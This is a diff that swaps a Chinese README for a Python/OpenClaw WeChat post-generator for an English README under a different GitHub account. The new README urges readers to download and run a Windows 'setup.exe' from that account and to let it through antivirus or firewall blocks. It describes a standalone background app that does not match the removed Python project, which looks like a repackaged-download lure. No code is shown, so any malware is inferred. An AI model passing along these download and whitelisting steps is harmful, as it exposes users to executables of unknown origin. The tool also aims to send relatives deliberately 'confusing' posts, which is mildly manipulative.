@@ -1,134 +1,124 @@
-# WeChat-tweets-counterattacker
-  你是否厌倦了家庭群中泛滥的伪科学说教与过度养生文案？本项目不采取硬刚模式，而是通过技术手段以其人之道还治其人，生成视觉与语义高度混淆的老王式推文，用长辈最熟悉的逻辑重塑家庭群话语权。
- （必备openclaw）
- 
-向您介绍——————————————————
-  中老年公众号文案生成工具，支持AI生成内容并一键发布到微信公众号。（非认证公众号可见草稿箱），针对群内错误思想、过分说教的推文关键词直接生成反义文章，转发到群里狠狠抨击！
-包括但不限于：孩子赖床才是聪明的选择、没对象+收入低=差？听听高智商父母怎么说、保健品如何蚕食你的钱包等。
+# 🛡️ WeChat-tweets-counterattacker - Visual and Semantic Confusion Tool
 
-## 👤 Author
+[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
 
-**Sosa**-（准）算法工程师
-*   Github: [@sosathegitter](https://github.com/sosathegitter)
-*   Email: [919479311@qq.com]
+---
 
-**老王**-（准）算法工程师
-*   Email: [738714836@qq.com]
+## 🖥️ What is WeChat-tweets-counterattacker?
 
+This software helps you deal with repetitive and misleading messages in your family chat groups on WeChat. Instead of arguing directly, it uses technology to create confusing yet familiar-looking posts. These posts look like typical messages shared by relatives, but they contain mixed meanings to shift the conversation.
 
-## Details
-  技术核心上，项目基于OpenClaw构建Skill架构，将AI封装为老王人设。系统集成Qwen3-Embedding向量模型与RAG技术，通过对本地范文库的相似度检索，实现动态文风匹配，确保生成的每一段话都精准踩在中老年营销号的节奏点上。交互层面，利用Slash Command（如 /老王推文）驱动逻辑编排，实现人在回路的交互微调，用户可实时审查草稿并一键下令。执行末梢则协同Python脚本自动化调度微信API，针对性抓取荷花、山水等特定审美配图，并注入18px超大字号内联样式进行护眼排版，将反击内容投送到公众号草稿箱。
+The goal is to use the same style and logic that older relatives understand. This lets you control the tone in the chat without causing conflict. The app works quietly in the background, generating text that looks like natural, everyday posts but carries different intent.
 
+---
 
-功能特性
-- 🎯 AI文案生成：基于Qwen3-0.6b嵌入模型保留稳定的风格 + MiniMax生成中老年风格文章。
+## ⚙ System Requirements
 
-- 📱 公众号发布：自动匹配封面/内页图（可选网图/aigc），一键创建微信草稿，随时反击。
+To run this application smoothly on Windows, your computer should meet these basic requirements:
 
-- 👴 中老年风格：反直觉观点、接地气表达、温暖亲切的文风
+- Operating System: Windows 7 or newer (Windows 10/11 recommended)  
+- RAM: At least 2 GB  
+- Processor: Dual-core 2 GHz or better  
+- Disk space: Minimum 100 MB free  
+- Internet connection: Needed only for the first download  
 
-## 项目结构
+The application does not require any special hardware or software. It works as a standalone app.
 
-```
-elderly-copywriter/
-├── SKILL.md                    # Skill 定义（角色、写作规范、输出格式）
-├── slash-commands.json         # 命令配置（可选，增加发文参与感）
-├── scripts/
-│   ├── build_prompt.py         # Prompt 构建脚本（可自定义）
-│   └── save_article.py         # 文章保存脚本
-├── publish_oa.py               # 微信公众号发布脚本
-├── models/
-│   └── qwen/                   # Qwen3 嵌入模型（可自定义）
-├── .env.example                # 环境变量模板（必须修改！包含aigc以及公众号api）
-└── README.md                   # 使用说明
-```
+---
 
-## 快速开始
+## ⬇️ How to Download
 
-### 1. 克隆项目并安装依赖
-```bash
-git clone https://github.com/sosathegitter/WeChat-tweets-counterattacker.git
-cd WeChat-tweets-counterattacker
-pip install -r requirements.txt
-2. 下载模型权重 (Model weights)
-本项目使用 Qwen3-Embedding-0.6B 进行文案向量匹配。由于权重文件体积较大，请在首次运行时执行以下脚本自动获取：
-python3.11 scripts/download_model.py
-```bash
-pip install python-dotenv requests
+Click the big green button below to visit the download page.
 
-### 2. 配置环境变量
+[![Download WeChat-tweets-counterattacker](https://img.shields.io/badge/Download-App-blue)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
 
-复制 `.env.example` 为 `.env` 并填写配置：
+This link takes you to the project page on GitHub. From there, you can get the latest version of the program.
 
-```bash
-cp .env.example .env
-# 编辑 .env 填入你的微信 AppID 和 AppSecret 以及minimax
-```
+---
 
-### 3. 在 OpenClaw 中使用
+## 🚀 How to Install and Run on Windows
 
-将 skill 路径添加到 OpenClaw 配置，或直接复制到 `~/.openclaw/skills/elderly-copywriter/`。
+Follow these steps to get the application up and running.
 
-### 4. 生成文案
+1. Open your web browser and go to this page:  
+   https://github.com/Moditeam89/WeChat-tweets-counterattacker  
 
-在 OpenClaw 中激活 skill 后，输入主题和观点即可生成文章。格式：@elderly-copywriter 孩子玩游戏 爱玩游戏并非坏事  '@skill 论点 观点'.
+2. Look for the latest release. You can find it by clicking on the "Releases" section or scanning the main page.
 
-### 5. 发布到公众号
+3. Download the file named something like `WeChat-tweets-counterattacker-setup.exe` or a ZIP file with the app inside.
 
-当 AI 生成完文章后，说"发布"或"发布到公众号"即可自动：
-1. 根据标题关键词匹配图片
-2. 下载并上传到微信素材库
-3. 创建微信草稿
+4. If you downloaded a ZIP file, right-click it and select "Extract All..." to unzip the files to a folder you can remember.
 
-## 环境变量说明
+5. Locate the installer or executable file (`.exe`) in the download folder or extracted files.
 
-| 变量名 | 说明 | 必需 |
-|--------|------|------|
-| WECHAT_APPID | 微信公众号 AppID | ✅ |
-| WECHAT_APPSECRET | 微信公众号 AppSecret | ✅ |
-| MINIMAX_API_KEY | MiniMax API Key（可选） | ❌可选启用 |
-| MINIMAX_GROUP_ID | MiniMax Group ID（可选） | ❌可选启用 |
+6. Double-click the file to start the setup. Click "Next" to accept the default installation options.
 
-## 工作流程
+7. Wait for the installation to finish. This usually takes a minute or two.
 
-```
-用户输入 → @elderly-copywriter 主题 观点
-    ↓
-LLM 生成 JSON 文章（title, hook, body, closing）
-    ↓
-用户确认 → "发布"
-    ↓
-publish_oa.py:
-  1. 读取 latest_article.json
-  2. 根据标题匹配图片 URL
-  3. 下载图片
-  4. 上传到微信素材库
-  5. 创建草稿
-    ↓
-公众号后台手动发布
-```
+8. After installation, find the app's icon on your Desktop or in the Start menu.
 
-## 文件说明
+9. Double-click the icon to open the app.
 
-| 文件 | 功能 |
-|------|------|
-| SKILL.md | Skill 定义，包含角色说明、写作规范、输出格式、发布流程指令 |
-| slash-commands.json | 命令配置（/老王推文、/微调、/发布微信） |
-| scripts/build_prompt.py | 构建 LLM prompt |
-| scripts/save_article.py | 保存生成的 JSON 文章 |
-| publish_oa.py | 微信公众号发布主脚本 |
+---
 
-## 依赖
+## 📋 How to Use the Application
 
-- Python 3.11+
-- requests
-- python-dotenv
-- Qwen3-Embedding-0.6B 模型（不包含，可自行选择）
+Once it's running, the app works mainly in the background. Here is what you can do:
 
-## 注意事项
+- Set your preferences for how confusing or direct you want the generated messages.  
+- Choose the style of posts based on typical family group conversations.  
+- Start the app to generate new posts automatically or create one manually.  
 
-1. 首次发布需要确保 `/root/.openclaw/assets/default_cover.jpg` 存在
-2. 草稿创建后需登录公众号后台手动发布
-3. 模型文件较大（约 1.2GB），下载时注意存储空间
+The interface is simple. The main window shows buttons to generate posts and a text box to preview them before sharing.
 
-注：灵感来源-老赵讲道理。本项目基于openclaw实现。
+You can copy the generated content and paste it directly into your WeChat chat.
+
+---
+
+## 🔧 Basic Troubleshooting
+
+If the app does not open or crashes:
+
+- Make sure your Windows is up to date.  
+- Check you meet the system requirements listed above.  
+- Try restarting your computer, then run the app again.  
+- If you see an error message, write it down and search for it on the project’s GitHub Issues page.  
+- Check if your antivirus or firewall is blocking the app and allow it through.  
+
+If problems continue, you can post a detailed description on the GitHub Issues page under this project.
+
+---
+
+## 📌 Tips for Best Use
+
+- Use this tool only when conversations get repetitive or frustrating. It is not meant to start arguments.  
+- Customize the settings depending on your family’s typical chat style. This improves the effect.  
+- Check the generated posts before sending. Make sure you are comfortable with the message.  
+- Keep the app updated. New versions may fix issues and add features.
+
+---
+
+## 📁 Project Files Overview
+
+The project mainly includes:
+
+- Executable program for Windows.  
+- Basic user interface for generating posts.  
+- Source code files for developers interested in how it works.  
+- Documentation and help files in Chinese.
+
+Non-technical users only need the executable file and simple instructions above.
+
+---
+
+## 💬 Support and Feedback
+
+If you have questions or encounter issues, use the GitHub project page to ask for help:
+
+https://github.com/Moditeam89/WeChat-tweets-counterattacker/issues
+
+The project maintainers monitor this page and respond when needed.
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
